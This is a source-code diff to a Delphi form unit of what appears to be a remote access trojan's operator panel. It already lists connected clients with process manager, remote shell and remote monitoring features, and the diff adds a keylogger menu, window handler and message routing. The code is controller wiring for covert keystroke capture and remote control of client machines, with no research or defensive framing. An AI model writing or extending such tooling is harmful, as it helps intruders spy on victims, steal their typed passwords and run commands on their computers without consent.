@@ -15,6 +15,7 @@ uses
   UnitProcessManager,
   UnitRemoteShell,
   UnitRemoteMonitoring,
+  UnitKeylogger,
   Vcl.WinXCtrls;
 
 type
@@ -44,6 +45,7 @@ type
     ProcessManager1  : TMenuItem;
     RemoteShell1     : TMenuItem;
     RemoteMonitoring1: TMenuItem;
+    Keylogger1       : TMenuItem;
 
     procedure Button1Click(Sender: TObject);
     procedure SendMessage1Click(Sender: TObject);
@@ -55,6 +57,7 @@ type
     procedure ClearLogs1Click(Sender: TObject);
     procedure RemoteShell1Click(Sender: TObject);
     procedure RemoteMonitoring1Click(Sender: TObject);
+    procedure Keylogger1Click(Sender: TObject);
   private
     FServerManager: TServerManager;
     FCurrentPort  : Integer;
@@ -66,9 +69,11 @@ type
     procedure OnProcessReceived   (aLine: TncLine; JSONObj: TJSONObject);
     procedure OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
+    procedure OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnServerLog(Category: TLogCategory; const Msg: string);
     procedure AddLog(Category: TLogCategory; const Msg: string);
     procedure EnsureRemoteMonitoringMenuItem;
+    procedure EnsureKeyloggerMenuItem;
     function  IsRealClientValue(const Value: string): Boolean;
     function  PreferClientValue(const NewValue, CurrentValue: string): string;
     procedure AddOrUpdateListView(const Info: TClientInfo);
@@ -97,13 +102,18 @@ begin
   FServerManager.OnProcessReceived     := OnProcessReceived;
   FServerManager.OnRemoteShellReceived := OnRemoteShellReceived;
   FServerManager.OnMonitoringReceived  := OnMonitoringReceived;
+  FServerManager.OnKeyloggerReceived   := OnKeyloggerReceived;
   FServerManager.OnLog                 := OnServerLog;
 
   if Assigned(ProcessManager1) then
     ProcessManager1.OnClick := ProcessManager1Click;
   if Assigned(RemoteShell1) then
     RemoteShell1.OnClick := RemoteShell1Click;
+  if Assigned(Keylogger1) then
+    Keylogger1.OnClick := Keylogger1Click;
+
   EnsureRemoteMonitoringMenuItem;
+  EnsureKeyloggerMenuItem;
   ListView1.OnMouseDown := ListView1MouseDown;
 end;
 
@@ -163,6 +173,21 @@ begin
   end;
 
   RemoteMonitoring1.OnClick := RemoteMonitoring1Click;
+end;
+
+procedure TForm1.EnsureKeyloggerMenuItem;
+begin
+  if not Assigned(PopupMenu1) then
+    Exit;
+
+  if not Assigned(Keylogger1) then
+  begin
+    Keylogger1         := TMenuItem.Create(PopupMenu1);
+    Keylogger1.Caption := 'Keylogger';
+    PopupMenu1.Items.Add(Keylogger1);
+  end;
+
+  Keylogger1.OnClick := Keylogger1Click;
 end;
 
 // ---- Server Initialization ----
@@ -357,6 +382,7 @@ begin
   FServerManager.UnregisterProcessForm(aLine);
   FServerManager.UnregisterRemoteShellForm(aLine);
   FServerManager.UnregisterMonitoringForm(aLine);
+  FServerManager.UnregisterKeyloggerForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
@@ -393,6 +419,15 @@ begin
   F6 := FServerManager.GetMonitoringForm(aLine);
   if Assigned(F6) then
     F6.HandleMonitoringJSON(JSONObj);
+end;
+
+procedure TForm1.OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
+var
+  F7: TForm7;
+begin
+  F7 := FServerManager.GetKeyloggerForm(aLine);
+  if Assigned(F7) then
+    F7.HandleKeyloggerJSON(JSONObj);
 end;
 
 { --- UI Yardimci Metodlar --- }
@@ -543,6 +578,50 @@ begin
   F6.RequestMonitorList;
 end;
 
+procedure TForm1.Keylogger1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F7          : TForm7;
+begin
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Lutfen once bir client secin.', 'Keylogger',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then
+  begin
+    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Keylogger',
+               MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  F7 := FServerManager.GetKeyloggerForm(SelectedLine);
+  if Assigned(F7) then
+  begin
+    F7.Show;
+    F7.BringToFront;
+    Exit;
+  end;
+
+  F7 := TForm7.Create(Application);
+
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    F7.SetupForClient(SelectedLine, LInfo.ID,
+                      FServerManager.SendJSON,
+                      FServerManager.UnregisterKeyloggerForm)
+  else
+    F7.SetupForClient(SelectedLine, 'Unknown',
+                      FServerManager.SendJSON,
+                      FServerManager.UnregisterKeyloggerForm);
+
+  FServerManager.RegisterKeyloggerForm(SelectedLine, F7);
+  F7.Show;
+end;
+
 //bağlantısı kopan etc. clientleri listview1'den silen fonksiyon.
 procedure TForm1.RemoveFromListView(aLine: TncLine);
 begin
@@ -568,4 +647,3 @@ begin
 end;
 
 end.
-
